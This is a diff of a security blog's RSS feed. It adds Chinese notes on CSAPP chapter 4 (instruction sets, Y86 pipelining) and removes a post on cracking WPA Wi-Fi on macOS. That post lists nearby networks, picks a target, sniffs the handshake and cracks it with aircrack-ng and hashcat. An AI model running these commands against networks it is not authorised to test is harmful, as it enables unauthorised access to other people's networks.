@@ -5,9 +5,44 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 26 Aug 2017 08:49:45 +0800</pubDate>
-    <lastBuildDate>Sat, 26 Aug 2017 08:49:45 +0800</lastBuildDate>
+    <pubDate>Tue, 29 Aug 2017 23:19:40 +0800</pubDate>
+    <lastBuildDate>Tue, 29 Aug 2017 23:19:40 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>深入理解计算机系统第4章笔记</title>
+        <description>&lt;p&gt;1.ISA:指令集体系结构,是指一个处理器支持的指令和指令的字节级编码&lt;/p&gt;
+
+&lt;p&gt;2.ISA在编译器编写者和处理器设计人员之间提供了一个概念抽象层,编译器编写者只需要知道允许哪些指令,以及它们是如何编码
+的;而处理器设计者必须建造出执行这些指令的处理器&lt;/p&gt;
+
+&lt;p&gt;3.ISA模型看上去应该是顺序指令执行,也就是先取出一条指令,等到它执行完毕,再开始下一条.然而,与一个时刻只执行一条指令
+相比,通过同时处理金条指令的不同部分,处理器可以获得较高的性能(流水线),为了保证处理器能达到同顺序执行相同的结果,人
+们采用了一些特殊的机制&lt;/p&gt;
+
+&lt;p&gt;4.生产处理器的公司很少,但是研究处理器的设计人员的队伍已经非常巨大了,而且还在增大.一个主要的处理器设计的各个方面大
+约涉及1000多人&lt;/p&gt;
+
+&lt;p&gt;5.HCL:硬件控制语言,是一种描述硬件系统控制部分的简单语言&lt;/p&gt;
+
+&lt;p&gt;6.基于顺序操作的功能正确但是有点不实用的Y86处理器是作者用的例子,基于这个顺序设计为基础,进行一系列的改造,创建一个
+流水线化的处理器,这个流水线化的处理器将每条指令的执行分解成五步,处理器可以同时执行五条指令的不同阶段,为了使这个处
+理器保留Y86 ISA的顺序的性质,要求处理很多冒险或冲突情况,冒险就是一条指令的位置或操作数信赖于其他仍在流水线中的指令&lt;/p&gt;
+
+&lt;p&gt;7.指令集的一个重要性质就是字节编码必须有唯一的解释,任意一个字节序列要么是一个唯一的指令序列的编码,要么就不是一个
+合法的字节序列&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 29 Aug 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/auxilary/2017/08/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC4%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
+        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC4%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
+        
+        <category>csapp</category>
+        
+        
+        <category>auxilary</category>
+        
+      </item>
     
       <item>
         <title>sqlmap以加载请求文件方式检测https服务器时存在的bug</title>
@@ -869,78 +904,6 @@ mainfunc(1,2)
         
         
         <category>python</category>
-        
-      </item>
-    
-      <item>
-        <title>wifi crack in macOS</title>
-        <description>&lt;h3 id=&quot;0x00-必读link&quot;&gt;0x00 必读link&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://gist.github.com/victorreyesh/6532800
-https://www.aircrack-ng.org/install.html
-https://apple.stackexchange.com/questions/117843/equivalent-of-airodump-ng-for-max-os-x
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;0x01-airport&quot;&gt;0x01 airport&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -name &quot;airport&quot;
-airport -s
-    root in ~ λ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
-                                SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
-                                zhen d8:c8:e9:02:74:08 -83  4       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)
-                           @Hos-WiFi 94:b4:0f:73:7a:72 -88  44,+1   Y  -- NONE
-                   HHT_10_2_229_225_ ac:cf:23:8c:70:b8 -44  11      Y  TW WPA2(PSK/AES/AES)
-                                 www 50:bd:5f:6e:3f:44 -68  11,-1   Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
-                          ziroom-11F b8:f8:83:d8:4a:2b -40  6,-1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)   
-
-(target=www)
-airport en1 sniff 11(en1 is the wifi netcard)
-wait...(find / -name &quot;*.cap&quot;,/tmp/*.cap exists)
-aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
-    或者将cap文件转成hashcat支持的格式再用hashcat破解:
-    a.将https://github.com/hashcat/hashcat-utils/releases里面的cap2hccapx.bin放到kali64(vm)下运行得到hccapx文件,然后再运行:
-    b.hashcat -a 3 -m 2500 output.hccapx ?d?d?d?d?d?d?d?d
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;0x02-attention&quot;&gt;0x02 Attention&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.aircrack-ng官网说airodump-ng和aireplay-ng在macOS不支持
-    airodump-ng可以看到已经建立的wifi连接
-    aireplay-ng可以主动攻击wifi,上面的airport en1 sniff 只能被动等待有人连接wifi
-    ---detail...
-    &quot; Mind you, airodump-ng and aireplay-ng are linux only and will not work under OSX native, so for reinjecting
-     and sniffing you will have to use other means.
-
-     If you have an intel Mac check out the VMware Fusion option which is mentioned lower on this page.&quot; 
-
-     也即,目前macOS sierra下只好较被动的用airport sniff命令较长时间以保证期间有handshake,不可主动攻击
-
-2.KisMac2不支持macOS sierra,目前新版本的macOS只能用上面的airport的被动方法crack wifi,除非找到了airodump-ng和
-aireplay-ng的替代品
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;0x03-xwifi&quot;&gt;0x03 xwifi&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;以上自动化脚本成xwifi如下
-https://github.com/3xp10it/xwifi/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Tue, 06 Jun 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/web/2017/06/06/wifi-crack-in-macOS/</link>
-        <guid isPermaLink="true">http://localhost:4000/web/2017/06/06/wifi-crack-in-macOS/</guid>
-        
-        <category>wifi</category>
-        
-        <category>crack</category>
-        
-        <category>macOS</category>
-        
-        
-        <category>web</category>
         
       </item>
     
